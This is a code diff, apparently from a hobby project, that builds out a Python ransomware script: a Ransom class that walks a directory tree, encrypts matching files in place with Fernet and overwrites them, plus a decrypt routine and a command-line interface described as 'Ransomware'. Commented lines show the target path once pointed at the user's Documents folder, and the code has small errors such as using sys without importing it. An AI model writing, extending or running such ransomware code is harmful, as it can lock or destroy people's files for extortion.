@@ -2,6 +2,7 @@
 from cryptography.fernet import Fernet 
 import os
 import getpass
+import argparse
 
 class Ransom:
 
@@ -30,21 +31,26 @@ class Ransom:
     def encryptFile(self, file):
         with open(file, 'rb+') as f:
             content = f.read()
-            content = self.fernet.encrypt(content)
+            encryptedContent = self.fernet.encrypt(content)
             f.seek(0) ## So we overwrite it
-            f.write(data)
+            f.write(encryptedContent)
+            f.truncate()
 
-    def decryptDirectory(self, dir):
-        for file in dir:
-            pass
-            # DEcrypt file
-        for d in dir:
-            pass
+    def decrypt(self):
+        for root, dirs, files in os.walk(self.root):
+            for file in files:
+                filePath = os.path.join(root, file)
+                if filePath.split('.')[-1] in self.targets:
+                    self.decryptFile(filePath)
             # DEcrypt directory recursive
-        pass
+        
     def decryptFile(self, file):
-        # TOdo
-        pass
+        with open(file, 'rb+') as f:
+            content = f.read()
+            decryptedContent = self.fernet.decrypt(content)
+            f.seek(0) ## So we overwrite it
+            f.write(decryptedContent)
+            f.truncate()
     
 
 def main():
@@ -59,10 +65,43 @@ def main():
     #print(path)
     ransom = Ransom(root = path)
     ransom.encrypt()
-    
 
-if __name__ == '__main__':
-    main()
+
+
+parser = argparse.ArgumentParser(description='Ransomware >:(')
+parser.add_argument('-e', help="Te key for encryption", action='store_true', dest="enc")
+parser.add_argument('-d', help="The key for encryption", action='store_true',dest="dec")
+parser.add_argument('-k', '--key', help ='Crypto key')
+args = parser.parse_args()
+
+enc = args.enc
+dec = args.dec
+key = args.key
+
+if enc and dec:
+    print('Can not both encrypt and decrypt at the same time.')
+    sys.exit(0)
+
+path = os.path.realpath('ransom.py')
+parts = path.split('/')
+path = '/'.join(parts[:-1])
+path+='/testDIr/'
+print(path)
+if dec:
+    
+    #doc_index = parts.index('Documents')
+    #path = '/'.join(parts[:doc_index+1])
+    #print(path)
+    ransom = Ransom(key = key, root = path)
+    ransom.decrypt()
+
+else: #Encrypt is default
+    ransom = Ransom(key = key, root = path)
+    print(ransom.key)
+    ransom.encrypt()
+
+#if __name__ == '__main__':
+    #main()
 
     
 
